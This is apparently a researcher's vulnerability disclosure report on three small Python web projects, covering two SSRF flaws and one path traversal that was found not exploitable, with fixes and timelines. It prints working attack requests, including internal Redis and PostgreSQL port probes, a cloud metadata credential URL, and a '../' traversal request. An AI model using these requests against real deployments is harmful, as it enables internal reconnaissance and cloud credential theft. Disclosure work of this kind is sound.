# Security Research Report
**Researcher:** Tanjot Singh  
**GitHub:** https://github.com/Tanjot-Singh-cyber  
**Methodology:** Static code review + live PoC testing  

---

## Report 1 — mrblomblo/blombooru

### Target Overview

| Field | Detail |
|---|---|
| Repository | https://github.com/mrblomblo/blombooru |
| Description | Self-hosted media tagging application |
| Language | Python (FastAPI) |
| Stars | ~50 |
| Contributors | 1 |
| Last Commit | April 2026 |
| Status | Actively maintained |

### Vulnerability

**Title:** Server-Side Request Forgery (SSRF) via unvalidated URL parameter in `/proxy-image` endpoint

**CWE:** CWE-918 — Server-Side Request Forgery  
**Severity:** Medium (standalone) / High (cloud deployment)  
**Advisory:** GHSA-5c5w-x8jp-fjqw  
**Status:** Pending developer response  

### Affected File

`backend/app/routes/booru_import.py` — function `proxy_image()`

### Vulnerable Code

```python
@router.get("/proxy-image")
async def proxy_image(
    url: str,
    current_user: User = Depends(require_admin_mode),
    db: Session = Depends(get_db)
):
    if not url.startswith("http"):   # only protection — trivially bypassed
        raise HTTPException(...)

    client = get_client_for_url(url, db=db)
    if client:
        external_resp = client.session.get(url, ...)
    else:
        # no client matched — falls through with zero filtering
        external_resp = requests.get(url, stream=True, timeout=60,
            headers={"User-Agent": "Blombooru/1.0 (booru-import)"})

    return StreamingResponse(external_resp.iter_content(...), ...)
```

### Root Cause

The endpoint accepts a user-supplied `url` parameter and fetches it server-side. The only validation is `startswith("http")` which is trivially bypassed by internal addresses. The `get_client_for_url()` function performs zero IP validation — if the URL doesn't match a known booru domain, it returns `None` and the request falls through to `requests.get()` with no filtering.

`requests.get()` follows redirects by default (`allow_redirects=True`), enabling redirect-chain bypasses via open redirects on trusted domains.

### Attack Scenarios

**Internal service enumeration:**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:6379
GET /api/booru-import/proxy-image?url=http://127.0.0.1:5432
```

**Cloud metadata credential theft:**
```
GET /api/booru-import/proxy-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Redirect chain bypass:**
```
requests.get() follows redirects by default.
An open redirect on a trusted domain can bounce to http://169.254.169.254/
```

### Live PoC

Tested on local instance (Python installation, PostgreSQL 18).

**Request 1 — Internal Redis port (6379):**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:6379
```
**Response:**
```json
{"detail":"admin.media_management.booru_import.error_proxy_failed:::Proxy failed"}
```
The error confirms the server attempted a TCP connection to the internal Redis port. The failure response proves the request left the application layer and reached the network layer internally.

**Request 2 — Recursive self-request (port 8000):**
```
GET /api/booru-import/proxy-image?url=http://127.0.0.1:8000
```
The server hung indefinitely — recursively proxying its own responses. Confirms arbitrary internal HTTP request execution.

### Impact

- Internal network port scanning
- Cloud metadata endpoint access — IAM credential theft on AWS/GCP/Azure deployments
- Bypasses network-level firewall rules — internal services unreachable externally become reachable through the server
- Admin credentials obtainable via phishing or session theft, making this exploitable by external attackers

### Suggested Fix

```python
from ipaddress import ip_address, ip_network
from urllib.parse import urlparse

BLOCKED_RANGES = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),
]

def is_ssrf_safe(url: str) -> bool:
    parsed = urlparse(url)
    host = parsed.hostname
    if not host or host in {"localhost"}:
        return False
    try:
        addr = ip_address(host)
        return not any(addr in net for net in BLOCKED_RANGES)
    except ValueError:
        return True
```

Also set `allow_redirects=False` on the requests call.

### Disclosure Timeline

| Date | Event |
|---|---|
| 2026-05-13 | Vulnerability identified via static code review |
| 2026-05-14 | Live PoC confirmed on local instance |
| 2026-05-14 | GitHub Security Advisory submitted — GHSA-5c5w-x8jp-fjqw |
| 2026-05-14 | PoC evidence and screenshot added to advisory |
| TBD | Developer response |
| TBD | CVE assigned |

---

## Report 2 — edihasaj/tuspyserver

### Target Overview

| Field | Detail |
|---|---|
| Repository | https://github.com/edihasaj/tuspyserver |
| Description | FastAPI library implementing TUS resumable upload protocol |
| Language | Python (FastAPI) |
| Stars | 35 |
| Contributors | 1 |
| Last Commit | December 2022 |
| PyPI Package | tuspyserver |

### Vulnerability (Investigated, Not Confirmed Exploitable)

**Title:** Path Traversal via unvalidated UUID parameter — mitigated by HTTP layer  
**CWE:** CWE-22 — Path Traversal (theoretical)  
**Severity:** Not applicable — not directly exploitable  
**Issue:** https://github.com/edihasaj/tuspyserver/issues/83  
**Status:** Closed as completed (defense-in-depth discussion)  

### Affected Files

- `src/tuspyserver/file.py` — `path` property
- `src/tuspyserver/routes/core.py` — HEAD, PATCH routes
- `src/tuspyserver/routes/termination.py` — DELETE route
- `src/tuspyserver/routes/creation.py` — Upload-Concat header parsing

### Vulnerable Code (Code Level)

```python
# file.py
@property
def path(self) -> str:
    return os.path.join(self._options.files_dir, f"{self.uid}")
```

`os.path.join()` does not resolve `..` sequences. The uid comes from the URL path parameter with no validation:

```python
# termination.py
@router.delete("/{uuid}")
async def extension_termination_route(uuid: str, ...):
    file = TusUploadFile(uid=uuid, options=file_options)
    file.delete(uuid)  # uuid never validated
```

Python confirmed path escapes `files_dir`:
```python
os.path.normpath(os.path.join("/app/uploads", "../config.py"))
# returns: /app/config.py
# normalized path startswith check: False
```

### Why Not Exploitable in Practice

During live testing, both uvicorn and Hypercorn normalize `..` sequences in URL paths before routing, per RFC 3986:

```
DELETE /files/../target.txt HTTP/1.1
→ Server receives: DELETE /target.txt HTTP/1.1
→ No route match → 404
```

The Upload-Concat header parsing also accidentally strips traversal:
```python
elif "/" in url_or_uid:
    path_parts = [p for p in url_or_uid.split("/") if p]
    uid = path_parts[-1]  # extracts "target.txt", drops ".."
```

### Conclusion

Code-level vulnerability exists. Standard HTTP servers mitigate it at the routing layer. Reported as a hardening issue — adding strict UUID format validation (`^[a-f0-9]{32}$`) would eliminate the theoretical risk entirely.

### Disclosure Timeline

| Date | Event |
|---|---|
| 2026-05-15 | Path traversal pattern identified via static code review |
| 2026-05-15 | Live testing — uvicorn blocks traversal via URL normalization |
| 2026-05-15 | Hypercorn tested — same result |
| 2026-05-15 | Issue #83 submitted with accurate assessment |
| 2026-05-15 | Developer reviewed and closed as completed |

### Key Lesson

Code-level vulnerability ≠ exploitable vulnerability. Static analysis finds candidates. Live testing confirms reality. Reporting accurately when a finding is weaker than expected is the correct approach.

---

## Report 3 — cedricbonhomme/newspipe

### Target Overview

| Field | Detail |
|---|---|
| Repository | https://github.com/cedricbonhomme/newspipe |
| Description | Self-hosted web news aggregator (RSS reader) |
| Language | Python (Flask) |
| Stars | ~485 |
| Contributors | 8 |
| Last Commit | May 2026 |
| Security Contact | cedric@cedricbonhomme.org |
| SECURITY.md | Yes — 48-hour response commitment |

### Vulnerability

**Title:** SSRF Protection Bypass via Feed Edit Endpoint  
**CWE:** CWE-918 — Server-Side Request Forgery  
**Severity:** Medium  
**Status:** Reported via email — pending response  

### Affected File

`newspipe/web/views/feed.py` — function `process_form()`

### Existing Protection

The project has a solid SSRF protection implementation in `newspipe/lib/url_validation.py`:

```python
def validate_url(url):
    parsed = urlsplit(url)
    if parsed.scheme not in ("http", "https"):
        raise SSRFError(...)
    _check_hostname(parsed.hostname)
    return url

def _check_hostname(hostname):
    addrinfos = socket.getaddrinfo(hostname, None, proto=socket.IPPROTO_TCP)
    for _family, _type, _proto, _canonname, sockaddr in addrinfos:
        ip = ipaddress.ip_address(sockaddr[0])
        if _is_blocked_ip(ip):
            raise SSRFError(f"URL resolves to a blocked IP address ({ip}).")

def _is_blocked_ip(ip):
    return (
        ip.is_private or ip.is_loopback or ip.is_link_local
        or ip.is_multicast or ip.is_reserved or ip.is_unspecified
    )
```

### The Bypass

`validate_url()` is called on feed **create** but not on feed **edit**:

```python
def process_form(feed_id=None):
    ...
    # Create path — PROTECTED
    if feed_id is None:
        validate_url(url)          # ← called
        feed = construct_feed_from(url)
        feed_contr.create(**feed)

    # Edit path — UNPROTECTED
    if feed_id is not None:
        feed_contr.update({"id": feed_id}, feed_attr)  # ← no validate_url
```

The crawler then fetches `feed.link` directly with no SSRF check:

```python
# newspipe/crawler/default_crawler.py
async with session.get(feed.link, timeout=timeout) as resp:
```

### Attack Chain

1. Authenticated user creates a feed with `https://example.com` — passes `validate_url()`
2. User edits the feed — changes `link` to `http://127.0.0.1:6379`
3. No validation on edit — internal address saved to database
4. Crawler runs — fetches `http://127.0.0.1:6379` with no SSRF check
5. Internal Redis port reached — server-side request forgery confirmed

### Impact

- Bypasses the developer's own SSRF protection implementation
- Internal service enumeration (Redis, PostgreSQL, other services)
- On cloud deployments — AWS/GCP metadata endpoint reachable
- Requires authenticated user account

### Suggested Fix

Call `validate_url()` in the edit code path before saving:

```python
if feed_id is not None:
    new_link = feed_attr.get("link")
    if new_link:
        try:
            validate_url(new_link)
        except SSRFError:
            flash(gettext("This URL is not allowed."), "danger")
            return redirect(url_for("home"))
    feed_contr.update({"id": feed_id}, feed_attr)
```

### Disclosure Timeline

| Date | Event |
|---|---|
| 2026-05-15 | Vulnerability identified via static code review |
| 2026-05-17 | Responsible disclosure email sent to cedric@cedricbonhomme.org |
| TBD | Developer response |
| TBD | Patch released |
| TBD | CVE requested |

---

## Summary

| Target | Vuln | Severity | Status |
|---|---|---|---|
| blombooru | SSRF — unvalidated proxy URL | Medium/High | Advisory live — pending response |
| tuspyserver | Path traversal — HTTP layer mitigated | N/A | Closed — defense-in-depth discussion |
| newspipe | SSRF bypass — unprotected edit path | Medium | Email sent — pending response |

**Methodology used across all targets:**
1. Identify dangerous function patterns via grep/findstr
2. Trace user-controlled input from source to sink
3. Check all code paths — not just the obvious ones
4. Live test before claiming exploitability
5. Report accurately — don't overclaim
